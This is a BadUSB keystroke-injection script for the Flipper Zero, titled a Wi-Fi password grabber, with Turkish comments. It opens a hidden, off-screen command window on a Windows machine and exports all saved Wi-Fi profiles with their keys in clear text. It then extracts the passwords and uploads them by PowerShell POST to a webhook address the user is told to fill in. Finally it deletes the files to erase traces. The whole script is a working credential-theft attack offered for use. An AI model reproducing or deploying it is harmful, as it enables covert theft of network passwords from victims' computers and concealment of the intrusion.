REM ==========================================
REM Wi-Fi Password Grabber for Flipper Zero
REM N4suh1
REM ==========================================

REM 1. Sistemi hazırla ve USB tanınmasını bekle
DELAY 3000

REM 2. Windows + R tuşuna bas (Run penceresi)
GUI r
DELAY 2000

REM 3. CMD penceresini aç ve hemen en küçük boyuta getir
REM "cmd /k" komutu pencereyi açar ve komutu çalıştırır.
REM "mode con: cols=15 lines=15" pencereyi görünmez boyuta indirger.
STRING cmd /k mode con: cols=15 lines=15
ENTER
DELAY 1500

REM 4. Pencereyi "Move" moduna alarak ekran dışına it (Gizleme Tekniği)
REM Alt + Space (Sistem menüsü)
ALT SPACE
DELAY 100
STRING m (Move komutu)
DELAY 100

REM Aşağı ok tuşuna basarak pencereyi ekranın altına it
REM 100 kez basmak genellikle ekranın dışına iter
REPEAT 100
DOWN
END

REM Enter ile pencereyi orada sabitle
ENTER
DELAY 500

REM 5. Geçici klasöre git
STRING cd %temp%
ENTER
DELAY 500

REM 6. Tüm Wi-Fi profilini XML olarak dışa aktar (Şifreler dahil)
STRING netsh wlan export profile key=clear
ENTER
DELAY 2000

REM 7. XML dosyalarından sadece şifre satırını (keyMaterial) ayıkla ve yeni dosyaya kaydet
STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
ENTER
DELAY 1500

REM 8. Şifre dosyasını Webhook sunucusuna gönder
REM <WEBHOOK_URL> KISMINI KENDİ ADRESİNİZLE DEĞİŞTİRİN
STRING powershell Invoke-WebRequest -Uri  <WEBHOOK_URL> -Method POST -InFile Wi-Fi-PASS  -UseBasicParsing
ENTER
DELAY 2000

REM 9. İzleri temizle (XML ve şifre dosyalarını sil)
STRING del Wi-* /s /f /q
ENTER
DELAY 500

REM 10. Komut penceresini kapat

ENTER

REM ==========================================
REM İşlem Tamamlandı
REM ==========================================
